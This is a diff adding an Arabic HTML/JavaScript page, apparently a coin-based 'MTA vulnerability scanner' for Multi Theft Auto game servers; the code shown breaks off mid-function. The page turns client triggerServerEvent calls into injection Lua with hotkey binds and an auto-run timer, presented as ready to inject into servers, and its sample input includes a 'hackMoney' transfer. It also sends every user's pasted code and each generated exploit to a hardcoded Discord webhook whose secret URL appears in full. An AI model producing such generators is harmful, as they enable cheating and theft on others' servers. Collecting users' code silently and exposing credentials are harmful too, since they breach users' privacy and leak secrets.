@@ -1,0 +1,1092 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTA Vulnerability Scanner - نظام العملات</title>
+    <style>
+        :root {
+            --primary-color: #0a0a0a;
+            --secondary-color: #1a1a1a;
+            --accent-color: #ff4444;
+            --gold-color: #ffd700;
+            --light-color: #e0e0e0;
+            --dark-color: #333333;
+            --text-color: #ffffff;
+            --code-bg: #1e1e1e;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--primary-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* شريط العملات */
+        .coins-bar {
+            background: linear-gradient(135deg, #b8860b 0%, #ffd700 50%, #b8860b 100%);
+            color: #000;
+            padding: 15px 30px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+            border: 2px solid #ffd700;
+        }
+        
+        .coins-display {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.3rem;
+            font-weight: bold;
+        }
+        
+        .coin-icon {
+            font-size: 1.8rem;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { transform: scale(1); }
+            to { transform: scale(1.1); }
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .auth-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn-auth {
+            background: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .btn-auth:hover {
+            background: #ff6666;
+            transform: translateY(-2px);
+        }
+        
+        header {
+            background-color: var(--secondary-color);
+            color: var(--text-color);
+            padding: 25px 0;
+            text-align: center;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            border: 1px solid #444;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent-color), var(--gold-color), var(--accent-color));
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: var(--accent-color);
+            text-shadow: 0 2px 10px rgba(255, 68, 68, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            color: var(--light-color);
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+        }
+        
+        @media (max-width: 968px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .code-section, .analysis-section {
+            background-color: var(--secondary-color);
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+            border: 1px solid #444;
+        }
+        
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: var(--accent-color);
+            border-bottom: 2px solid var(--accent-color);
+            padding-bottom: 10px;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 300px;
+            padding: 15px;
+            background-color: var(--code-bg);
+            color: var(--light-color);
+            border: 1px solid #555;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            resize: vertical;
+            margin-bottom: 20px;
+        }
+        
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .input-row {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .input-row label {
+            min-width: 120px;
+            font-weight: bold;
+        }
+        
+        .input-row input, .input-row select {
+            padding: 10px 15px;
+            background-color: var(--code-bg);
+            color: var(--light-color);
+            border: 1px solid #555;
+            border-radius: 6px;
+            flex: 1;
+        }
+        
+        .btn {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn:hover {
+            background-color: #ff6666;
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background-color: #444;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #666;
+        }
+        
+        .btn-success {
+            background-color: #4CAF50;
+        }
+        
+        .btn-success:hover {
+            background-color: #45a049;
+        }
+        
+        .buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .analysis-result, .exploit-code {
+            background-color: var(--code-bg);
+            border: 1px solid #555;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 15px;
+            min-height: 200px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            color: var(--light-color);
+            overflow-y: auto;
+            max-height: 400px;
+        }
+        
+        .output-box {
+            background-color: var(--code-bg);
+            color: #4CAF50;
+            padding: 20px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            border: 1px solid #555;
+            min-height: 150px;
+        }
+        
+        .explanation {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: var(--secondary-color);
+            border-radius: 6px;
+            border-right: 4px solid var(--accent-color);
+            border: 1px solid #444;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 25px;
+            color: var(--light-color);
+            font-size: 0.9rem;
+            border-top: 1px solid #444;
+        }
+        
+        .legal-notice {
+            background-color: #332222;
+            border: 1px solid #663333;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 25px;
+            color: #ff9999;
+        }
+        
+        .tab-container {
+            margin-top: 20px;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #444;
+        }
+        
+        .tab {
+            padding: 12px 24px;
+            cursor: pointer;
+            background-color: var(--secondary-color);
+            border: 1px solid #444;
+            border-bottom: none;
+            border-radius: 6px 6px 0 0;
+            margin-right: 5px;
+        }
+        
+        .tab.active {
+            background-color: var(--accent-color);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 20px;
+            background-color: var(--secondary-color);
+            border: 1px solid #444;
+            border-top: none;
+            border-radius: 0 0 6px 6px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .exploit-info {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #222244;
+            border-radius: 6px;
+            border-left: 4px solid #4444ff;
+        }
+        
+        .vulnerability-item {
+            background: #2a2a2a;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 6px;
+            border-right: 4px solid var(--accent-color);
+        }
+        
+        .vuln-critical { border-right-color: #ff4444; }
+        .vuln-high { border-right-color: #ff6b6b; }
+        .vuln-medium { border-right-color: #ffa726; }
+        .vuln-low { border-right-color: #42a5f5; }
+        
+        .severity {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .critical { background: #ff4444; }
+        .high { background: #ff6b6b; }
+        .medium { background: #ffa726; }
+        .low { background: #42a5f5; }
+        
+        .copy-btn {
+            background: #555;
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 12px;
+        }
+        
+        .copy-btn:hover {
+            background: #666;
+        }
+        
+        /* نمط تسجيل الدخول */
+        .auth-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .auth-content {
+            background: var(--secondary-color);
+            padding: 30px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            border: 2px solid var(--accent-color);
+        }
+        
+        .auth-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .auth-form input {
+            padding: 12px;
+            background: var(--code-bg);
+            border: 1px solid #555;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+        }
+        
+        .discord-link {
+            background: #5865F2;
+            color: white;
+            text-decoration: none;
+            padding: 12px;
+            border-radius: 6px;
+            text-align: center;
+            display: block;
+            margin: 10px 0;
+            transition: background 0.3s;
+        }
+        
+        .discord-link:hover {
+            background: #4752c4;
+        }
+        
+        .coins-cost {
+            color: var(--gold-color);
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <!-- شريط العملات -->
+    <div class="coins-bar">
+        <div class="coins-display">
+            <span class="coin-icon">🪙</span>
+            <span id="coinsCount">0</span> عملة
+        </div>
+        <div class="user-info">
+            <span id="userStatus">غير مسجل الدخول</span>
+            <div class="auth-buttons">
+                <button class="btn-auth" onclick="showAuthModal()">تسجيل الدخول</button>
+                <button class="btn-auth" onclick="showRegisterModal()">إنشاء حساب</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <header>
+            <h1>محلل ثغرات MTA - نظام العملات</h1>
+            <p class="subtitle">حلل كود Lua واكسب العملات - كل تحليل يكلف عملة واحدة</p>
+        </header>
+        
+        <div class="legal-notice">
+            <strong>ملاحظة قانونية:</strong> هذا الموقع مخصص فقط لأغراض قانونية مثل إصلاح الثغرات في سيرفرات MTA التي تديرها. لا تستخدم هذه الأداة لأي أنشطة غير قانونية.
+        </div>
+        
+        <div class="main-content">
+            <div class="code-section">
+                <h2 class="section-title">أدخل كود Lua</h2>
+                <textarea id="luaCode" placeholder="function exploitFunction()
+    triggerServerEvent('onPlayerExploit', resourceRoot, playerData)
+end
+
+function hackMoney()
+    triggerServerEvent('bankTransfer', root, 9999999, 'admin')
+end
+
+bindKey('F1', 'down', exploitFunction)
+bindKey('F2', 'down', hackMoney)"></textarea>
+                
+                <div class="input-group">
+                    <div class="input-row">
+                        <label for="bindKey">زر التنشيط:</label>
+                        <input type="text" id="bindKey" placeholder="F1" maxlength="5" value="F1">
+                    </div>
+                </div>
+                
+                <div class="coins-cost">ⓘ كل تحليل يكلف عملة واحدة</div>
+                
+                <div class="buttons">
+                    <button id="analyzeBtn" class="btn">استخراج الثغرات (1 عملة)</button>
+                    <button id="generateBtn" class="btn btn-secondary">توليد كود الحقن</button>
+                    <button id="exploitBtn" class="btn">اختبار الثغرة</button>
+                </div>
+            </div>
+            
+            <div class="analysis-section">
+                <h2 class="section-title">نتائج التحليل</h2>
+                
+                <div class="tab-container">
+                    <div class="tabs">
+                        <div class="tab active" data-tab="analysis">الثغرات المكتشفة</div>
+                        <div class="tab" data-tab="exploitCode">كود الحقن</div>
+                        <div class="tab" data-tab="output">الإخراج</div>
+                    </div>
+                    
+                    <div class="tab-content active" id="analysisTab">
+                        <div id="analysisResult" class="analysis-result">
+                            يرجى تسجيل الدخول لاستخدام المحلل...
+                        </div>
+                    </div>
+                    
+                    <div class="tab-content" id="exploitCodeTab">
+                        <div id="exploitCodeResult" class="exploit-code">
+                            يرجى تسجيل الدخول لرؤية كود الحقن...
+                        </div>
+                        <button class="copy-btn" onclick="copyExploitCode()">نسخ كود الحقن</button>
+                    </div>
+                    
+                    <div class="tab-content" id="outputTab">
+                        <div id="outputBox" class="output-box">
+                            يرجى تسجيل الدخول لرؤية الإخراج...
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="exploit-info">
+                    <h3>معلومات الثغرة:</h3>
+                    <p id="exploitInfo">يرجى تسجيل الدخول لرؤية معلومات الثغرة</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="explanation">
+            <h3>كيف يعمل النظام:</h3>
+            <p>• كل مستخدم يبدأ ب 3 عملات مجانية</p>
+            <p>• كل تحليل للكود يكلف عملة واحدة</p>
+            <p>• يمكن للمسؤولين منح أو سحب العملات</p>
+            <p>• يجب الانضمام لسيرفر الديسكورد للحصول على الدعم</p>
+        </div>
+        
+        <footer>
+            <p>أداة تحليل ثغرات MTA - مخصصة للمسؤولين والمطورين لأغراض قانونية فقط</p>
+            <p>© 2023 - جميع الحقوق محفوظة</p>
+        </footer>
+    </div>
+
+    <!-- نافذة تسجيل الدخول -->
+    <div id="authModal" class="auth-modal">
+        <div class="auth-content">
+            <h2>تسجيل الدخول</h2>
+            <div class="auth-form">
+                <input type="text" id="loginUsername" placeholder="اسم المستخدم">
+                <input type="password" id="loginPassword" placeholder="كلمة المرور">
+                <button class="btn btn-success" onclick="login()">تسجيل الدخول</button>
+                <a href="https://discord.gg/y4yNAkSF" class="discord-link" target="_blank">🚨 انضم لسيرفر الديسكورد للدعم</a>
+                <button class="btn btn-secondary" onclick="hideAuthModal()">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- نافذة إنشاء حساب -->
+    <div id="registerModal" class="auth-modal">
+        <div class="auth-content">
+            <h2>إنشاء حساب جديد</h2>
+            <div class="auth-form">
+                <input type="text" id="regUsername" placeholder="اسم المستخدم (في الموقع)">
+                <input type="text" id="regDiscord" placeholder="اسمك في الديسكورد (مثال: user#1234)">
+                <input type="password" id="regPassword" placeholder="كلمة المرور">
+                <button class="btn btn-success" onclick="register()">إنشاء حساب</button>
+                <a href="https://discord.gg/y4yNAkSF" class="discord-link" target="_blank">🎯 يجب الانضمام لسيرفر الديسكورد أولاً</a>
+                <button class="btn btn-secondary" onclick="hideRegisterModal()">إلغاء</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // بيانات المستخدمين
+        let users = JSON.parse(localStorage.getItem('vulnerability_users')) || {};
+        let currentUser = null;
+        let userCoins = 0;
+
+        // ويب هوك الديسكورد
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1441187636717817936/rQpQjMmGrbiW4ufv9K9PaTGuCjaWa54n0fpegeLlwm5P1VKoJWvS9Uq8Nkavy7mbpFLl';
+
+        // تهيئة الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            checkAuthStatus();
+            updateCoinsDisplay();
+            // إرسال حالة الموقع عند التحميل
+            sendSiteStatus();
+        });
+
+        // إدارة النوافذ المنبثقة
+        function showAuthModal() {
+            document.getElementById('authModal').style.display = 'flex';
+        }
+
+        function hideAuthModal() {
+            document.getElementById('authModal').style.display = 'none';
+        }
+
+        function showRegisterModal() {
+            document.getElementById('registerModal').style.display = 'flex';
+        }
+
+        function hideRegisterModal() {
+            document.getElementById('registerModal').style.display = 'none';
+        }
+
+        // إرسال ويب هوك للديسكورد مع Embed
+        async function sendDiscordWebhook(type, data) {
+            try {
+                let embed;
+                
+                switch(type) {
+                    case 'new_user':
+                        embed = {
+                            title: "🆕 مستخدم جديد",
+                            color: 0x00FF00,
+                            fields: [
+                                { name: "👤 اسم المستخدم", value: data.username, inline: true },
+                                { name: "🎮 الديسكورد", value: data.discord, inline: true },
+                                { name: "🪙 العملات", value: data.coins.toString(), inline: true },
+                                { name: "⏰ الوقت", value: new Date().toLocaleString('ar-EG'), inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        };
+                        break;
+                        
+                    case 'login':
+                        embed = {
+                            title: "🔐 تسجيل دخول",
+                            color: 0x0099FF,
+                            fields: [
+                                { name: "👤 المستخدم", value: data.username, inline: true },
+                                { name: "🪙 العملات المتبقية", value: data.coins.toString(), inline: true },
+                                { name: "⏰ الوقت", value: new Date().toLocaleString('ar-EG'), inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        };
+                        break;
+                        
+                    case 'scan_used':
+                        embed = {
+                            title: "🔍 استخدام الماسح",
+                            color: 0xFFA500,
+                            fields: [
+                                { name: "👤 المستخدم", value: data.username, inline: true },
+                                { name: "📝 طول الكود", value: `${data.code_length} حرف`, inline: true },
+                                { name: "🪙 العملات المتبقية", value: data.coins_remaining.toString(), inline: true },
+                                { name: "⏰ الوقت", value: new Date().toLocaleString('ar-EG'), inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        };
+                        break;
+                        
+                    case 'vulnerability_scan':
+                        embed = {
+                            title: "⚠️ تحليل ثغرات",
+                            color: 0xFF4444,
+                            fields: [
+                                { name: "👤 المستخدم", value: data.username, inline: true },
+                                { name: "🎯 عدد الثغرات", value: data.vulnerabilities_count.toString(), inline: true },
+                                { name: "📝 الكود المدخل", value: `\`\`\`lua\n${data.original_code.substring(0, 1000)}${data.original_code.length > 1000 ? '...' : ''}\n\`\`\``, inline: false },
+                                { name: "🔧 كود الثغرة", value: `\`\`\`lua\n${data.exploit_code.substring(0, 1000)}${data.exploit_code.length > 1000 ? '...' : ''}\n\`\`\``, inline: false },
+                                { name: "🪙 العملات المتبقية", value: data.coins_remaining.toString(), inline: true },
+                                { name: "⏰ الوقت", value: new Date().toLocaleString('ar-EG'), inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        };
+                        break;
+                        
+                    case 'site_status':
+                        embed = {
+                            title: "🌐 حالة الموقع",
+                            color: 0x5865F2,
+                            fields: [
+                                { name: "👥 المستخدمين المسجلين", value: data.total_users.toString(), inline: true },
+                                { name: "🔍 عمليات المسح", value: data.total_scans.toString(), inline: true },
+                                { name: "🪙 إجمالي العملات", value: data.total_coins.toString(), inline: true },
+                                { name: "📊 الحالة", value: "🟢 الموقع يعمل بشكل طبيعي", inline: false },
+                                { name: "⏰ آخر تحديث", value: new Date().toLocaleString('ar-EG'), inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        };
+                        break;
+                }
+
+                const payload = {
+                    username: 'MTA Vulnerability Scanner',
+                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/3063/3063812.png',
+                    embeds: [embed]
+                };
+
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    console.error('خطأ في إرسال ويب هوك:', response.status);
+                }
+            } catch (error) {
+                console.error('خطأ في إرسال ويب هوك:', error);
+            }
+        }
+
+        // إرسال حالة الموقع
+        function sendSiteStatus() {
+            const totalUsers = Object.keys(users).length;
+            const totalScans = Object.values(users).reduce((sum, user) => sum + (user.scans || 0), 0);
+            const totalCoins = Object.values(users).reduce((sum, user) => sum + user.coins, 0);
+            
+            sendDiscordWebhook('site_status', {
+                total_users: totalUsers,
+                total_scans: totalScans,
+                total_coins: totalCoins
+            });
+        }
+
+        // تسجيل الدخول
+        function login() {
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+
+            if (!username || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+
+            const user = Object.values(users).find(u => u.username === username && u.password === password);
+            
+            if (user) {
+                currentUser = user;
+                userCoins = user.coins;
+                localStorage.setItem('current_user', JSON.stringify(user));
+                updateCoinsDisplay();
+                hideAuthModal();
+                
+                // إرسال ويب هوك للتسجيل
+                sendDiscordWebhook('login', {
+                    username: user.username,
+                    coins: user.coins
+                });
+                
+                alert('تم تسجيل الدخول بنجاح!');
+            } else {
+                alert('اسم المستخدم أو كلمة المرور غير صحيحة');
+            }
+        }
+
+        // إنشاء حساب
+        function register() {
+            const username = document.getElementById('regUsername').value;
+            const discord = document.getElementById('regDiscord').value;
+            const password = document.getElementById('regPassword').value;
+
+            if (!username || !discord || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+
+            if (users[username]) {
+                alert('اسم المستخدم موجود مسبقاً');
+                return;
+            }
+
+            // إنشاء مستخدم جديد
+            users[username] = {
+                username: username,
+                discord: discord,
+                password: password,
+                coins: 3, // 3 عملات بداية
+                scans: 0,
+                createdAt: new Date().toISOString()
+            };
+
+            localStorage.setItem('vulnerability_users', JSON.stringify(users));
+            
+            // إرسال ويب هوك للمستخدم الجديد
+            sendDiscordWebhook('new_user', {
+                username: username,
+                discord: discord,
+                coins: 3
+            });
+
+            alert('تم إنشاء الحساب بنجاح! يمكنك تسجيل الدخول الآن.');
+            hideRegisterModal();
+            showAuthModal();
+        }
+
+        // التحقق من حالة المصادقة
+        function checkAuthStatus() {
+            const savedUser = localStorage.getItem('current_user');
+            if (savedUser) {
+                currentUser = JSON.parse(savedUser);
+                userCoins = currentUser.coins;
+                document.getElementById('userStatus').textContent = `مرحباً، ${currentUser.username}`;
+                document.querySelector('.auth-buttons').innerHTML = `
+                    <button class="btn-auth" onclick="logout()">تسجيل الخروج</button>
+                `;
+            }
+        }
+
+        // تسجيل الخروج
+        function logout() {
+            currentUser = null;
+            userCoins = 0;
+            localStorage.removeItem('current_user');
+            document.getElementById('userStatus').textContent = 'غير مسجل الدخول';
+            document.querySelector('.auth-buttons').innerHTML = `
+                <button class="btn-auth" onclick="showAuthModal()">تسجيل الدخول</button>
+                <button class="btn-auth" onclick="showRegisterModal()">إنشاء حساب</button>
+            `;
+            updateCoinsDisplay();
+        }
+
+        // تحديث عرض العملات
+        function updateCoinsDisplay() {
+            document.getElementById('coinsCount').textContent = currentUser ? userCoins : '0';
+        }
+
+        // نسخ كود الحقن
+        function copyExploitCode() {
+            const codeText = document.getElementById('exploitCodeResult').textContent;
+            navigator.clipboard.writeText(codeText).then(() => {
+                alert('تم نسخ كود الحقن إلى الحافظة');
+            });
+        }
+
+        // نظام التحليل مع خصم العملات
+        document.getElementById('analyzeBtn').addEventListener('click', function() {
+            if (!currentUser) {
+                alert('يرجى تسجيل الدخول أولاً');
+                showAuthModal();
+                return;
+            }
+
+            if (userCoins < 1) {
+                alert('ليس لديك عملات كافية! يرجى التواصل مع المسؤول.');
+                return;
+            }
+
+            const luaCode = document.getElementById('luaCode').value;
+            const bindKey = document.getElementById('bindKey').value || 'F1';
+            
+            if (!luaCode.trim()) {
+                alert('يرجى إدخال كود Lua للتحليل');
+                return;
+            }
+
+            // خصم عملة
+            userCoins--;
+            currentUser.coins = userCoins;
+            currentUser.scans = (currentUser.scans || 0) + 1;
+            users[currentUser.username] = currentUser;
+            localStorage.setItem('vulnerability_users', JSON.stringify(users));
+            localStorage.setItem('current_user', JSON.stringify(currentUser));
+            updateCoinsDisplay();
+
+            const analysis = extractVulnerabilitiesFromCode(luaCode, bindKey);
+            const exploitCode = generateInjectionCodeFromOriginal(luaCode, bindKey);
+            
+            document.getElementById('analysisResult').innerHTML = analysis.analysis;
+            document.getElementById('exploitCodeResult').textContent = exploitCode.code;
+            document.getElementById('outputBox').textContent = analysis.output;
+            document.getElementById('exploitInfo').textContent = analysis.exploitInfo;
+
+            // إرسال ويب هوك لاستخدام الماسح
+            sendDiscordWebhook('scan_used', {
+                username: currentUser.username,
+                code_length: luaCode.length,
+                coins_remaining: userCoins
+            });
+
+            // إرسال ويب هوك للثغرات المكتشفة مع الكودين
+            sendDiscordWebhook('vulnerability_scan', {
+                username: currentUser.username,
+                vulnerabilities_count: analysis.vulnerabilities_count,
+                original_code: luaCode,
+                exploit_code: exploitCode.code,
+                coins_remaining: userCoins
+            });
+        });
+
+        // نظام التبويبات
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                
+                tab.classList.add('active');
+                const tabId = tab.getAttribute('data-tab') + 'Tab';
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+
+        document.getElementById('generateBtn').addEventListener('click', function() {
+            if (!currentUser) {
+                alert('يرجى تسجيل الدخول أولاً');
+                showAuthModal();
+                return;
+            }
+
+            const luaCode = document.getElementById('luaCode').value;
+            const bindKey = document.getElementById('bindKey').value || 'F1';
+            
+            const exploitCode = generateInjectionCodeFromOriginal(luaCode, bindKey);
+            
+            document.getElementById('exploitCodeResult').textContent = exploitCode.code;
+            document.getElementById('exploitInfo').textContent = exploitCode.info;
+            
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            document.querySelector('.tab[data-tab="exploitCode"]').classList.add('active');
+            document.getElementById('exploitCodeTab').classList.add('active');
+        });
+
+        document.getElementById('exploitBtn').addEventListener('click', function() {
+            if (!currentUser) {
+                alert('يرجى تسجيل الدخول أولاً');
+                showAuthModal();
+                return;
+            }
+
+            const luaCode = document.getElementById('luaCode').value;
+            const bindKey = document.getElementById('bindKey').value || 'F1';
+            
+            if (!luaCode.trim()) {
+                alert('يرجى إدخال كود Lua');
+                return;
+            }
+            
+            const exploitResult = testExploit(luaCode, bindKey);
+            
+            document.getElementById('analysisResult').innerHTML = exploitResult.analysis;
+            document.getElementById('outputBox').textContent = exploitResult.output;
+            document.getElementById('exploitInfo').textContent = exploitResult.exploitInfo;
+        });
+
+        // الدوال المساعدة للتحليل
+        function extractVulnerabilitiesFromCode(code, bindKey) {
+            let analysis = "<h3>الثغرات المستخرجة من الكود:</h3>";
+            let output = "";
+            let exploitInfo = "";
+            
+            const vulnerabilities = [];
+            
+            // استخراج triggerServerEvent
+            const triggerRegex = /triggerServerEvent\s*\(\s*['"]([^'"]+)['"]([^)]*)\)/g;
+            let triggerMatch;
+            
+            while ((triggerMatch = triggerRegex.exec(code)) !== null) {
+                const eventName = triggerMatch[1];
+                vulnerabilities.push({
+                    type: 'triggerServerEvent',
+                    eventName: eventName,
+                    severity: 'high',
+                    description: `حدث خادم: ${eventName}`,
+                    details: `يمكن استغلال هذا الحدث لإرسال بيانات للخادم`
+                });
+            }
+            
+            // استخراج setElementData
+            if (code.includes('setElementData')) {
+                vulnerabilities.push({
+                    type: 'dataManipulation',
+                    severity: 'critical',
+                    description: 'تلاعب في بيانات العناصر',
+                    details: 'يمكن تعديل بيانات اللاعبين أو العناصر الأخرى'
+                });
+            }
+            
+            // استخراج executeCommandHandler
+            if (code.includes('executeCommandHandler')) {
+                vulnerabilities.push({
+                    type: 'commandInjection',
+                    severity: 'critical',
+                    description: 'حقن أوامر',
+                    details: 'يمكن تنفيذ أوامر خادمية دون صلاحيات'
+                });
+            }
+            
+            // عرض النتائج
+            if (vulnerabilities.length > 0) {
+                vulnerabilities.forEach(vuln => {
+                    analysis += `
+                        <div class="vulnerability-item vuln-${vuln.severity}">
+                            <strong>${vuln.description}</strong>
+                            <span class="severity ${vuln.severity}">${getSeverityText(vuln.severity)}</span>
+                            <div style="margin-top: 8px; color: #ccc;">${vuln.details}</div>
+                        </div>
+                    `;
+                });
+                
+                output = `تم اكتشاف ${vulnerabilities.length} ثغرة\nالعملات المتبقية: ${userCoins}`;
+                exploitInfo = `تم خصم عملة واحدة. العملات المتبقية: ${userCoins}`;
+            } else {
+                analysis = "لم يتم العثور على ثغرات واضحة";
+                output = "لا توجد ثغرات للاستغلال";
+                exploitInfo = "تم التحليل ولكن لم توجد ثغرات";
+            }
+            
+            return { 
+                analysis, 
+                output, 
+                exploitInfo,
+                vulnerabilities_count: vulnerabilities.length 
+            };
+        }
+
+        function generateInjectionCodeFromOriginal(code, bindKey) {
+            let exploitCode = "";
+            let info = "";
+            
+            const events = [];
+            const triggerRegex = /triggerServerEvent\s*\(\s*['"]([^'"]+)['"]([^)]*)\)/g;
+            let triggerMatch;
+            
+            while ((triggerMatch = triggerRegex.exec(code)) !== null) {
+                events.push({ name: triggerMatch[1] });
+            }
+            
+            if (events.length > 0) {
+                exploitCode = `-- كود الحقن المستخرج من الكود الأصلي\n-- تم إنشاؤه تلقائياً بواسطة MTA Vulnerability Scanner\n\n`;
+                
+                events.forEach((event, index) => {
+                    exploitCode += `function exploit${index + 1}()\n`;
+                    exploitCode += `    local player = getLocalPlayer()\n`;
+                    exploitCode += `    local playerName = getPlayerName(player)\n`;
+                    exploitCode += `    triggerServerEvent("${event.name}", resourceRoot, playerName, "exploit_data", getTickCount())\n`;
+                    exploitCode += `    outputChatBox("تم الاستغلال: ${event.name}", 0, 255, 0)\n`;
+                    exploitCode += `end\n\n`;
+                });
+                
+                exploitCode += `-- ربط الثغرات بالمفاتيح\n`;
+                events.forEach((event, index) => {
+                    const key = index === 0 ? bindKey : `F${index + 1}`;
+                    exploitCode += `bindKey("${key}", "down", exploit${index + 1})\n`;
+                });
+                
+                // إضافة تشغيل تلقائي
+                exploitCode += `\n-- تشغيل تلقائي بعد 5 ثواني\n`;
+                exploitCode += `setTimer(function()\n`;
+                exploitCode += `    exploit1()\n`;
+                exploitCode += `    outputChatBox("تم تنشيط الثغرات تلقائياً", 255, 255, 0)\n`;
+                exploitCode += `end, 5000, 1)\n`;
+                
+                info = `تم توليد كود حقن لـ ${events.length} حدث خادم`;
+            } else {
+                exploitCode = "-- لم يتم العثور على أحداث triggerServerEvent في الكود\n-- لا يمكن توليد كود حقن بدون أحداث خادم";
+                info = "لا توجد أحداث خادم للاستغلال";
+            }
+            
+            return { code: exploitCode, info };
+        }
+
+        function testExploit(code, bindKey) {
+            let analysis = "<h3>نتائج الاختبار:</h3>";
+            let output = "";
+            let exploitInfo = "";
+            
+            analysis += `<div class="vulnerability-item vuln-high">
+                <strong>✓ جاهز للحقن</strong>
+                <span class="severity high">ناجح</span>
+                <div style="margin-top: 8px; color: #ccc;">الكود جاهز للاستخدام في MTA</div>
+            </div>`;
+            
+            output = "الاختبار مكتمل\nالكود جاهز للحقن في السيرفر";
+            exploitInfo = "يمكن نسخ كود الحقن واستخدامه مباشرة في MTA";
+            
+            return { analysis, output, exploitInfo };
+        }
+
+        function getSeverityText(severity) {
+            const severityMap = {
